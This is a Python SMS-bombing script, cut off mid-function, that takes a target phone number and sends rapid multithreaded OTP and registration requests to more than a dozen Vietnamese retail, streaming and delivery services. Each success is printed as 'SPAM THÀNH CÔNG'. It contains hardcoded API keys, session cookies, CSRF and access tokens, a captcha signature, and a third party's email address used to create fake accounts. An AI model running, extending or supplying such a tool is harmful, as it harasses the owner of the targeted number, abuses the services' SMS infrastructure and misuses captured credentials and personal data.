import requests, os, time, sys
from concurrent.futures import ThreadPoolExecutor
if len(sys.argv) != 2:
        print("Usage: python sms.py <phone_number>")
        sys.exit(1)
sdt = sys.argv[1]
spam = 10
threading = ThreadPoolExecutor(max_workers=int(100))
def tv360(sdt):
    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', headers=headers, json=json_data).json()
    if response ['errorCode'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THẤT BẠI')
def hoangphuc(sdt):
    headers = {
        'authority': 'hoang-phuc.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hoang-phuc.com',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'action_type': '1',
        'tel': sdt,
    }
    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', headers=headers, data=data).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THẤT BẠI')

def fmplus(sdt):
    headers = {
        'authority': 'api.fmplus.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.fm.com.vn',
        'referer': 'https://www.fm.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '320a2995-6b36-445d-aa57-2dc514e31d0e',
    }
    json_data = {
        'Phone': sdt,
        'LatOfMap': '',
        'LongOfMap': '',
        'Browser': '',
    }
    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data).json()
    if response ['Code'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THẤT BẠI')

def winmart(sdt):
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': 'Chi mum',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2006-03-24',
        'gender': 'Male',
    }
    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data).json()
    try:
        if response ['code'] == 'S200':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')

def gateway(sdt):
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data).json()
    if response ['code'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THẤT BẠI')
def hine(sdt):
    headers = {
        'authority': 'ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone': sdt,
    }
    response = requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', headers=headers, json=json_data,).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THẤT BẠI')

def medicare(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6IkZBTVZlcS9XSXdUb1lscll6d01BMlE9PSIsInZhbHVlIjoiRkRENVR6QUpKNUI5RWZoSTVqc0pmeHBvZTFFdGMxU1ZTQWNYWk5GOWRPbTNJNDFmeUYvbGVXZmcxVmo2QWJMcmdpL0J3dWx3ZzRsSklmT0Y2YVJldHZwSGJDazhZd0QrWVcwM3BGbFpzbndTMjI1bk1pV0xwK1AxTE5LQ0lnU3IiLCJtYWMiOiJjMzBkYzlkNDFiNjY1OTVhODVlN2E0YWVlZTQ4ZGMxYjMwYjQ5ZGRhNTU3ODYyYWUzZmU0MmZiYjFmMGUzNjk3IiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }
    response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data).json()
    try:
        if response ['error_code'] == 'fail':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')

def batdongsan(sdt):
    headers = {
        'authority': 'batdongsan.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    params = {
        'phoneNumber': sdt,
    }
    response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers,).json()
    try:
        if response ['data'] == 'success':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')

def tokyolife(sdt):
    headers = {
        'authority': 'api-prod.tokyolife.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone_number': sdt,
        'name': 'Chí Mum',
        'password': 'jkhjhgjfdf232',
        'email': 'nthanhhang518@gmail.com',
        'birthday': '2000-07-27',
        'gender': 'male',
    }
    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THẤT BẠI')

def futabus(sdt):
    headers = {
        'authority': 'api.vato.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '73b9cbca-6c66-448e-bc60-b2946513dae3',
        'use_for': 'LOGIN',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data).json()
    if response ['message'] == 'OK':
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THẤT BẠI')

def thegioididong(sdt):
    cookies = {
        '_pk_id.7.8f7e': '9c724764956bef42.1702359947.',
        '_tt_enable_cookie': '1',
        '_ttp': 'KQA3JgCFOt6YHFu4dkvxwHtQliw',
        '_gcl_au': '1.1.1518817158.1722078722',
        'DMX_Personal': '%7B%22UID%22%3A%2264427b53a9f018fb5a07208341e683075e50e904%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '_gid': 'GA1.2.886869943.1722078729',
        '_fbp': 'fb.1.1722078735335.7879853641260818',
        '_ce.clock_event': '1',
        '_ce.clock_data': '17%2C171.225.192.16%2C1%2Cb9cbd8dc13f19f9e7eb854f472bfa274%2CChrome%2CVN',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJc36VghUMIXcUCfMbjDf35vXybwAstKCVd3Kt.1',
        'TBMCookie_3209819802479625248': '424499001722172923rziLe3nNfP7bjIjbJeIpQ4lEXR8=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBOgOSeFLhnXEk9Fw8nTeieWrfAVAJIvGbQS9qi_fdPCnUDqNZAGTnqxFkB2BRYv-lnY_z1DfNm22izmf88UogciW0whFg0F8DEbUBJoYXWXgc0_E7xLPETnQlalNqn6Pc4',
        'SvID': 'beline2687|ZqZGB|ZqZF/',
        '_gat': '1',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1722129686%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.7.8f7e': '1',
        '_ga': 'GA1.1.313192879.1702359943',
        '_ga_TZK5WPYMMS': 'GS1.2.1722129689.4.0.1722129689.60.0.0',
        '_ce.irv': 'returning',
        'cebs': '1',
        'cebsp_': '1',
        '_ga_TLRZMSX5ME': 'GS1.1.1722129686.4.0.1722129698.48.0.0',
        '_ce.s': 'v~ \033[1;35mc6e2ca938eaea49c763466ff529031923bcb71d8~ \033[1;35mlcw~ \033[1;35m1722129717030~ \033[1;35mlva~ \033[1;35m1722129695755~ \033[1;35mvpv~ \033[1;35m3~ \033[1;35mv11.fhb~ \033[1;35m1702359951793~ \033[1;35mv11.lhb~ \033[1;35m1702359951795~ \033[1;35mv11.cs~ \033[1;35m127806~ \033[1;35mv11.s~ \033[1;35mbb7354b0-4c7f-11ef-be80-4b611bbe8e1a~ \033[1;35mv11.sla~ \033[1;35m1722129717670~ \033[1;35mlcw~ \033[1;35m1722129717672',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBPs1LjJxh5Owv4bKmBI0grR-wL-mwH1sMFTvXZVlrpM2yIqgNr2eSZY5kjPMiERdGovLf265Im0BQHkZfklBfyibZ-Kogh2sSbEG3RTQp553JTgXd-3V1LoeFmsBZnDoe4',
    }
    response = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data,).json()
    if response ['statusCode'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THẤT BẠI')

def kingfoodmart(sdt):
    headers = {
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'domain': 'kingfoodmart',
    'sec-ch-ua-mobile': '?0',
    'authorization': '',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'Referer': 'https://kingfoodmart.com/',
    'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AWNCXZbkmtm8HOQPn3e-X5kQpLKbMAsrmlLAIhm2NBWvJStQYJ53ScQcbPQJS8o33FMyHYilnbdPtGcTr8ajL0ZA2QytqGB5tnIJsFZAFSPp-dfJKD5N1MQBZxqqp2xPcQfhYD30MZG-ingJCUGidN_b3Rc:U=2cffb4ffa0000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data).json()
    data2 = response['data']['sendOtp']
    if data2 == None:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THẤT BẠI')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THÀNH CÔNG')

def lottemart(sdt): # API lottemart CALL
    headers = {
        'authority': 'www.lottemart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://www.lottemart.vn',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'username': sdt,
        'case': 'register',
    }
    response = requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_cto/V1/mart-sms/sendotp', headers=headers, json=json_data).json()
    try:
        if response ['error'] == '':
            print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THÀNH CÔNG")
        else:
            print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")
    except:
        print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")

def dienmayxanh(sdt):
    cookies = {
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
        '_gcl_gs': '2.1.k1$i1722078197',
        '_gcl_au': '1.1.1611829968.1722078202',
        '_pk_id.8.8977': '0cb4a8484e372aa4.1722078206.',
        '_gcl_aw': 'GCL.1722078207.Cj0KCQjwtZK1BhDuARIsAAy2VzuN0p7BMri4YzOeVrmRZF82UOTa2C-_i_QpagDDIsqHo6h1DOlffIIaAt-9EALw_wcB',
        '_ga': 'GA1.1.1672433188.1722078207',
        '__zi': '2000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuHBJPyyZhgXabb2mJMDzUIPMKBEEOZ-hfnOIO0uYFIkdLX2WZG.1',
        '_fbp': 'fb.1.1722078218028.559509456155849295',
        'utm_source': 'cityads',
        'utm_medium': 'cpa',
        'utm_campaign': 'MjvvG5',
        '_aff_network': 'cityads',
        '_aff_sid': 'aqgZ22mTXBZ76M3',
        'TBMCookie_3209819802479625248': '4462780017222238799AOLy9yE5q6nH1amg3l09l7YcWw=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T4vn_BRd2kD_-TRoCbYZazma9b_j4RDAFL8IO7rwClqDNL2lMM5nSamFCS7o5l1qjIoN9kdwtxgwxXX6oY6xgZIfO4EhCxYHb5TIbbOpQZ_PRgzLYKGkQiK5Llk4bIXLI',
        'SvID': 'new26124|ZqcNG|ZqcNC',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1722223907%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.8.8977': '1',
        '_ga_Y7SWKJEHCE': 'GS1.1.1722223906.4.0.1722223914.52.0.0',
        '_ce.irv': 'returning',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '2940%2C171.225.192.16%2C1%2Cb9cbd8dc13f19f9e7eb854f472bfa274%2CChrome%2CVN',
        'cebsp_': '1',
        '_ce.s': 'v~ \033[1;35m38cb32180cdce4003e7f4d90fa1e2b86c06284d7~ \033[1;35mlcw~ \033[1;35m1722223975023~ \033[1;35mlva~ \033[1;35m1722223918305~ \033[1;35mvpv~ \033[1;35m1~ \033[1;35mv11.cs~ \033[1;35m218102~ \033[1;35mv11.s~ \033[1;35m1e7547e0-4d5b-11ef-8fde-fdb33d105bee~ \033[1;35mv11.sla~ \033[1;35m1722223975014~ \033[1;35mgtrk.la~ \033[1;35mlz6fos3j~ \033[1;35mlcw~ \033[1;35m1722223975234',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5QRnzdsOX6wJwBNHWxVAZkCdekJGPmWf83yiWIAWL7tng95WeRrzVVbDh0cGw2UXxEuk0o5Zu6ImdSLVigwXCZ41kqhGCo5NCw2oUiiJuQd2vEgpX-jSoqdyDTp_9iyBAs',
    }
    response = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data).json()
    # print(response)
    if response ['statusCode'] == 200:
        print("[BY: REVIEWTOOL] ~ \033[1;35m ĐMX SPAM THÀNH CÔNG")
    else:
        print("[BY: REVIEWTOOL] ~ \033[1;35m ĐMX SPAM THẤT BẠI")
# \\ Vui lòng tôn trọng tác giả không xóa//
# /* Copyright © 27/07/2024 : Developer Chí Mum */
def reebok(sdt):
    headers = {
        'authority': 'reebok-api.hsv-tech.io',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '58958cff16d30c3aea2a38efcfa6c9ad',
        'origin': 'https://reebok.com.vn',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        # 'timestamp': '1722225374837',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phoneNumber': sdt,
    }
    response = requests.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data).json()
    # print(response)
    try:
        if response ['statusCode'] == 400:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')

def glxplay(sdt):
    headers = {
        'authority': 'api.glxplay.io',
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5YzJkZTlkMy01NjllLTQ0MGMtOTFhOS1kZjEwMDEwMGYxYjEiLCJkaWQiOiI5MzQ4MmRjZC01MDY0LTQzNTgtODgyMi0xMjE0NDlmZjA4OTMiLCJpcCI6IjE3MS4yMjUuMTkyLjE2IiwibWlkIjoiTm9uZSIsInBsdCI6IndlYnxwY3x3aW5kb3dzfDEwfGNocm9tZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIyMjYzMjIsImV4cCI6MTczNzc3ODMyMn0.08SBQk_2rwYxXD-kVkQOAfIi5pAry1es80L4XUqES3w',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {
